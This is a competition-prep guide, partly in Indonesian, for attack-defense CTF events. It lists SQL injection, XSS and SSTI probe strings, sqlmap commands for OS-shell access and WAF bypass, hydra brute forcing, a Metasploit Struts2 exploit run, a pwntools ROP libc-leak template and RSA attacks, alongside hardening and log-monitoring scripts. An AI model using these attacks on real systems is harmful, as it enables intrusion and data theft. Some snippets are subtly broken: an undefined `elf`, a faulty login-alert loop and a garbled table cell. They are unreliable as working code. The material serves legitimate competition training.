---
title: "Attack Defense — Kompetisi Prep Guide: Web Exploitation, Network Pentest, Binary Exploitation, Defense & Hardening"
tags:
  - cyber-security
  - attack-defense
  - ctf
  - kompetisi
  - exploitation
  - library
aliases:
  - "Attack Defense Competition Guide"
  - "Red Team Competition Prep"
created: "2026-07-28"
updated: "2026-07-28"
status: active
cssclasses:
  - wide-table
---

> [!info] Ringkasan
> Panduan persiapan kompetisi **Attack Defense** — mencakup web exploitation, network penetration testing, binary exploitation, crypto attacks, serta teknik defense & hardening. Berdasarkan direktori riset di [[research-resource-directory-deep]] dan strategi di [[ctf-competition-methodology-strategy]]. Target: 15 menit per service exploitation, 5 menit per patch.

**Cross-link:** [[ctf-tool-arsenal-universal]] → [[attack-defense-hardening-playbook]] → [[hierarchy-offensive]] → [[web-hacking-exploitation]] → [[exploit-development]] → [[fuzzing-vulnerability-research]] → [[hierarchy-cyber-range-adversary-emulation]]

---

## Daftar Isi

- [[#S1 — Format Attack Defense]]
- [[#S2 — Web Exploitation Checklist]]
- [[#S3 — Network & Service Exploitation]]
- [[#S4 — Binary Exploitation (PWN)]]
- [[#S5 — Crypto Attacks]]
- [[#S6 — Defense & Hardening (5 Menit)]]
- [[#S7 — Monitoring & Detection]]
- [[#S8 — Tool Priority Matrix]]
- [[#S9 — Referensi Cepat]]

---

## S1 — Format Attack Defense

Attack Defense adalah format kompetisi tim: setiap tim punya infrastruktur sendiri (biasanya VM/server) dengan service yang vulnerable. Tim lawan berusaha menyerang service kita, sementara kita harus menjaga service tetap up dan flags tidak dicuri.

### Cycle

```
ROUND 1 (5-15 menit)
├── Attack: Scan network, identifikasi service lawan, exploit
├── Defense: Patch service, harden konfigurasi, pasang monitoring
└── Check: System check apakah service masih berfungsi

ROUND 2...
```

### Scoring

| Aksi                  | Poin              |
| --------------------- | ----------------- |
| Flag capture (attack) | +N poin per flag  |
| Service up (defense)  | +M poin per round |
| Flag loss (kebobolan) | -P poin           |
| Service down (crash)  | -Q poin           |

**Prioritas:** Defense score + Service availability > Attack score. Menjaga service tetap up adalah prioritas #1.

---

## S2 — Web Exploitation Checklist

### Tool Stack

```bash
# Burp Suite — intercept dan manipulate request
# SQLMap — SQL injection automation
# Nuclei — template-based vulnerability scanner
# Gobuster — directory/file enumeration
# Nikto — web server scanner
```

### Quick Win Checklist

| Vuln        | Deteksi                     | Exploit                               | Fix                        |
| ----------- | --------------------------- | ------------------------------------- | -------------------------- |
| SQLi        | `' OR 1=1 --`               | `sqlmap -u "http://target/page?id=1"` | Prepared statement         |
| XSS         | `<script>alert(1)</script>` | steal cookie via webhook              | Output encoding            |
| LFI         | `../../etc/passwd`          | RFI + inclusion                       | Path sanitization          |
| SSTI        | `{{7*7}}` → `49`            | RCE via template                      | No user input in templates |
| IDOR        | Change ID parameter         | Access other user data                | Server-side access control |
| File Upload | Upload .php                 | Webshell via upload                   | Extension whitelist        |
| SSRF        | URL parameter               | Internal network scan                 | URL allowlist              |

### SQLMap Cheat

```bash
# Dump semua database
sqlmap -u "http://target.com/page?id=1" --dbs

# Dump tabel spesifik
sqlmap -u "http://target.com/page?id=1" -D db_name --tables

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --level 5 --risk 3 --tamper=space2comment
```

### Gobuster

```bash
# Direktori
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Subdomain
gobuster vhost -u http://target.com -w subdomains.txt

# DNS
gobuster dns -d target.com -w subdomains.txt
```

---

## S3 — Network & Service Exploitation

### Service Enumeration

```bash
# Nmap — full scan
nmap -sC -sV -p- -T4 -oA scan_target 10.10.10.0/24

# Service-specific
nmap -sV -p 21 --script=ftp* 10.10.10.10  # FTP
nmap -sV -p 22 --script=ssh* 10.10.10.10  # SSH
nmap -sV -p 3306 --script=mysql* 10.10.10.10  # MySQL
nmap -sV -p 6379 --script=redis* 10.10.10.10  # Redis
```

### Common Service Exploits

| Port   | Service    | Common Vuln                  | Tool                         |
| ------ | ---------- | ---------------------------- | ---------------------------- |
| 21     | FTP        | Anonymous access, weak creds | `hydra -l ftp -P pass.txt`   |
| 22     | SSH        | Default creds, weak keys     | `hydra`, `ssh-audit`         |
| 80/443 | HTTP       | Web vuln (SQLi, XSS, LFI)    | Burp, SQLMap, Nuclei         |
| 3306   | MySQL      | Root no password             | `mysql -h target -u root`    |
| 6379   | Redis      | No auth, RCE via cron        | Redis-cli, SSH key overwrite |
| 27017  | MongoDB    | No auth                      | `mongo target:27017`         |
| 5432   | PostgreSQL | Weak creds                   | `psql -h target -U postgres` |
| 8080   | HTTP Proxy | SSRF, open proxy             | Proxy chaining               |

### Metasploit Quick

```bash
msfconsole

# Search exploit
msf6 > search apache

# Use exploit
msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 > set RHOSTS 10.10.10.10
msf6 > set RPORT 8080
msf6 > run
```

---

## S4 — Binary Exploitation (PWN)

### Toolchain

```bash
# Reverse Engineering
ghidra  # GUI decompiler
r2 -A binary  # radare2
objdump -d binary  # Basic disassemble

# Exploit Dev
python -c "import pwn; print(pwn.ELF('./binary'))"  # pwntools
checksec --file=binary  # Security checks

# Fuzzing
afl-fuzz -i input/ -o output/ ./binary @@
```

### Checksec

```text
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found           ← Buffer overflow harder
NX:       NX enabled             ← No shellcode on stack
PIE:      PIE enabled            ← Address randomized
```

### Common Exploit Techniques

| Vuln             | Condition                 | Teknik                      |
| ---------------- | ------------------------- | --------------------------- |
| Buffer overflow  | No canary, NX disabled    | Shellcode on stack          |
| ROP              | No canary, NX enabled     | Return-oriented programming |
| Format string    | `printf(user_input)`      | Memory read/write           |
| Integer overflow | Arithmetic tanpa validasi | Bypass bounds check         |
| Use-after-free   | Heap vuln                 | Heap spray + corrupt        |
| Ret2libc         | ASLR but known libc       | Return to system()          |

### pwntools Template

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# Connect
r = remote('10.10.10.10', 1337)
# r = process('./binary')

# Craft payload
payload = b'A' * 72  # Offset to RIP
payload += p64(0x4005f6)  # ROP gadget: pop rdi; ret
payload += p64(elf.got['puts'])  # Leak libc
payload += p64(elf.plt['puts'])
payload += p64(0x400556)  # main

r.sendline(payload)
r.interactive()
```

---

## S5 — Crypto Attacks

### Common CTF Crypto

| Type          | Tool                                                                                | Approach            |
| ------------- | ----------------------------------------------------------------------------------- | ------------------- |
| Caesar/ROT    | `python -c "import codecs; print(codecs.decode('...', 'rot13'))"`                   | Brute force shift   |
| Base64/32     | `echo '...'                                                                         | base64 -d`          | Decode |
| XOR           | `python xor_crack.py`                                                               | Frequency analysis  |
| RSA (small e) | `python -c "from Crypto.Util.number import *; print(long_to_bytes(pow(ct, e, n)))"` | Cube root           |
| Vigenere      | `vigenere-decoder`                                                                  | Kasiski examination |
| Hash crack    | `hashcat -m 0 hash.txt rockyou.txt`                                                 | Dictionary attack   |
| AES-ECB       | Detect block pattern                                                                | Block manipulation  |

### RSA Common Attack

```python
# Small e attack
from Crypto.Util.number import long_to_bytes, inverse
import gmpy2

m = gmpy2.iroot(ct, e)[0]
print(long_to_bytes(int(m)).decode())

# Common modulus (same n, different e)
g, x, y = gmpy2.gcdext(e1, e2)
m = pow(ct1, x, n) * pow(ct2, y, n) % n
print(long_to_bytes(m))
```

---

## S6 — Defense & Hardening (5 Menit)

Setiap round defense, lakukan checklist ini:

### 1. Patch Known Vuln (30 detik)

```bash
# Web: disable directory listing
echo "Options -Indexes" >> /var/www/html/.htaccess

# SSH: disable root login
sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config

# Service: restart dengan konfigurasi aman
systemctl restart sshd apache2
```

### 2. Firewall (60 detik)

```bash
# Allow port service, block others
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -s 10.10.10.0/24 -j ACCEPT
iptables -A INPUT -j DROP
```

### 3. Change Credentials (30 detik)

```bash
# Ganti semua default password
echo -e "newpass123\nnewpass123" | passwd root
echo -e "newpass456\nnewpass456" | passwd admin

# FTP/MySQL user
mysql -e "ALTER USER 'root'@'localhost' IDENTIFIED BY 'newpass';"
```

### 4. Monitor (60 detik)

```bash
# Watch log
tail -f /var/log/auth.log | grep "Failed password" &

# Simple intrusion detection
while true; do
  if grep -q "Accepted" /var/log/auth.log | tail -1; then
    echo "⚠️ New login!" | wall
  fi
  sleep 5
done &
```

### 5. Backup & Rollback (30 detik)

```bash
# Backup konfigurasi asli sebelum patch
cp -r /etc/apache2 /root/backup-apache/
```

---

## S7 — Monitoring & Detection

### Quick Network Monitor

```bash
# Monitor koneksi baru
watch -n 1 "ss -tupn | grep ESTAB"

# Cek port listening
ss -tulpn

# Monitor traffic real-time
tcpdump -i eth0 -n port 80 or port 22
```

### Log Alerting

```bash
# SSH brute force detect
journalctl -u sshd | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -rn

# Apache 4xx errors
tail -f /var/log/apache2/access.log | grep " 404 \| 403 \| 500 "
```

---

## S8 — Tool Priority Matrix

| Attack Domain       | Tool #1           | Tool #2               | Tool #3    |
| ------------------- | ----------------- | --------------------- | ---------- |
| Web Exploit         | Burp Suite        | SQLMap                | Nuclei     |
| Service Exploit     | Metasploit        | Nmap + NSE            | Hydra      |
| Binary Exploit      | pwntools (Python) | Ghidra                | GDB + peda |
| Crypto              | hashcat           | Python (pycryptodome) | CyberChef  |
| Network Scan        | Nmap              | Masscan               | RustScan   |
| Password Cracking   | Hashcat           | John                  | Hydra      |
| Reverse Engineering | Ghidra            | radare2               | IDA Free   |
| Recon               | Gobuster          | FFUF                  | Amass      |

| Defense Domain | Tool #1                       | Tool #2                 |
| -------------- | ----------------------------- | ----------------------- |
| Hardening      | iptables/nftables             | `sed` + config template |
| Monitoring     | tcpdump                       | journalctl              |
| IDS            | Snort/Suricata (if available) | Log tail                |
| Patch          | Source code edit              | Config lockdown         |

---

## S9 — Referensi Cepat

- [[research-resource-directory-deep]] — sumber tools lengkap
- [[ctf-competition-methodology-strategy]] — strategi CTF
- [[ctf-tool-arsenal-universal]] — semua tool
- [[attack-defense-hardening-playbook]] — hardening lengkap
- [[web-hacking-exploitation]] — teknik web
- [[exploit-development]] — exploit dev
- [[fuzzing-vulnerability-research]] — fuzzing
- [[hierarchy-ctf-competition-framework]] — framework kompetisi
- [[hierarchy-cyber-range-adversary-emulation]] — cyber range
